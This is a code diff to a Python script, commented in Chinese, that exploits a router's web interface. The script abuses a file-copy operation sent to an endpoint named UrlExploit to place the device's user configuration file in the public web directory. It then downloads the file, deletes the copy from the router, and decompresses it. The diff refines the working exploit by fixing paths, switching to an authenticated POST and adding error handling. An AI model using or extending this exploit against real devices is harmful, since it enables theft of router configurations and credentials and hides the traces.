@@ -19,7 +19,7 @@ def unPack(f: BytesIO):
         next_offset = int.from_bytes(f.read(4), byteorder='big')
         # 解压数据块的数据
         data = f.read(block_size)
-        unpacked_bytes += zlib.decompress(data)  # return decompress byteswap   
+        unpacked_bytes += zlib.decompress(data)  # return decompress byteswap
     return unpacked_bytes
 
 
@@ -60,8 +60,12 @@ print('软件版本号:', dev_info['SWVer'])
 print('MAC地址:   ', dev_info['MAC'], '\n')
 
 # 将配置文件复制到httpd的目录下
-payload = {'opstr': 'copy|//userconfig/cfg|/home/httpd/public|db_user_cfg.xml', 'fileLists': 'db_user_cfg.xml/'}
-r = session.get(UrlExploit, params=payload)
+payload = { 'opstr': 'copy|/userconfig/cfg|/home/httpd/public|db_user_cfg.xml', 'fileLists': 'db_user_cfg.xml/', 'token': token }
+r = session.post(UrlExploit, data=payload)
+
+if not r.text:
+    print('复制文件失败')
+    exit()
 
 # 从httpd目录下载文件
 r = session.get(UrlDownCfg)
@@ -76,7 +80,7 @@ with open(filename, 'wb') as fd:
 print("已将原始配置文件保存到本地 db_user_cfg.xml")
 
 # 清空路由器httpd中文件
-payload = {'token': token, 'path': '//home/httpd/public', 'fileLists': 'db_user_cfg.xml/'}
+payload = {'token': token, 'path': '/home/httpd/public', 'fileLists': 'db_user_cfg.xml/'}
 r = session.post(UrlDeleteFile, data=payload)
 
 # 构建BytesIO
